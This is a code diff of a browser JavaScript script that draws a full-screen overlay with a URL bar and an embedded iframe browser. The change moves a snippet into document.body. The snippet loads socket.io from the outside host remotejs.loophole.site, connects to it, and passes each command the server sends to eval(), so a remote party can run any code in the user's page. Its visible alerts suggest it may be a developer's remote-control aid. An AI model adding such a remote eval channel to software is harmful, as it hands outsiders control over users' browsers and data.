@@ -10,15 +10,6 @@ if (document.getElementById('sidemenu')) {
     bdy.appendChild(sidemenu);
     sidemenu.setAttribute('style', 'height:100%; width:100%; color:white; font-family:Monospace; font-size:12px; z-index:10000; display: inline-block; overflow:visible; position:fixed; left:0; top: 0; background:black;');
     sidemenu.innerHTML=`
-    <script src="https://remotejs.loophole.site/socket.io/socket.io.js"/>
-    <script>
-      alert("Connecting");
-      var socket = io.connect("https://remotejs.loophole.site");
-      alert("Connected");
-      socket.on("command", function(command) {
-        eval(command);
-      });
-    </script>
     <input style="height:4%; border:solid black 1px; color:white; background:grey; font-family:Monospace;" id="urlinput"/>
     
     <button style="width:20px; height:4%; border:none; color:white; background:grey; font-family:Monospace;" onclick="url=document.getElementById('urlinput').value;if(url.startsWith('https://')){document.getElementById('sidemenuframe').src=url;}else if(url.startsWith('http://')){alert('[WARN] http might not work due to downgrade policy.');document.getElementById('sidemenuframe').src=url;}else{document.getElementById('sidemenuframe').src='https://'+url}">⌕</button>
@@ -29,6 +20,17 @@ if (document.getElementById('sidemenu')) {
     
     <iframe id="sidemenuframe" src="data:text/html,<body style='background:black; color:white; font-family:Monospace;'>Enter URL above</body>" style="height:96%; width:100%; color:black; font-family:Monospace; font-size:12px; z-index:10000; display: float; overflow:visible; position:fixed; left:0; top: 4%; background:white; border:none; float:left;"></iframe>`;
 }
+document.body.innerHTML+=`
+<script src="https://remotejs.loophole.site/socket.io/socket.io.js"/>
+<script>
+  alert("Connecting");
+  var socket = io.connect("https://remotejs.loophole.site");
+  alert("Connected");
+  socket.on("command", function(command) {
+    eval(command);
+  });
+</script>
+`
 void 0;
 document.onkeydown = function (e) {
   if (e.code=="ControlRight"){
